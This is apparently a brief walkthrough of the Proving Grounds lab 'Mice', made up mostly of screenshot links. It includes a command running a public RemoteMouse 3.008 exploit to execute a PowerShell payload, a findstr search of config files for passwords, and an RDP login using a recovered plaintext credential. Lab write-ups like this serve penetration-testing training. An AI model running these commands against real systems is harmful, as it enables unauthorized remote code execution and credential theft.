---
title: Mice
date: 2026-01-20T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - rpc
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Mice"
---


![](Screenshot%202025-12-15%20at%2009.09.49.png)

![](Screenshot%202025-12-16%20at%2007.30.24.png)

google: remotemouse 1978 "github" "exploit"

https://github.com/p0dalirius/RemoteMouse-3.008-Exploit/blob/master/README.md



`./RemoteMouse-3.008-Exploit.py -t 192.168.184.199 -v -c 'powershell -c "C:/Windows/Temp/payload.ps1 -c cmd"'`

![](Screenshot%202025-12-16%20at%2015.57.09.png)

![](Screenshot%202025-12-16%20at%2015.56.48.png)

We were struggling to get WinPeas onto the machine so we did some manual enumeration. 

![](Screenshot%202025-12-17%20at%2008.32.49.png)

`findstr /SIM /C:"pass" *.ini *.cfg *.xml`

![](Screenshot%202025-12-17%20at%2008.31.39.png)

![](Screenshot%202025-12-17%20at%2008.30.31.png)

![](Screenshot%202025-12-16%20at%2016.44.26.png)

`xfreerdp3 /v:192.168.184.199 /u:divine /p:ControlFreak11 /f`

![](Screenshot%202025-12-16%20at%2016.43.44.png)

![](Screenshot%202025-12-16%20at%2016.39.28.png)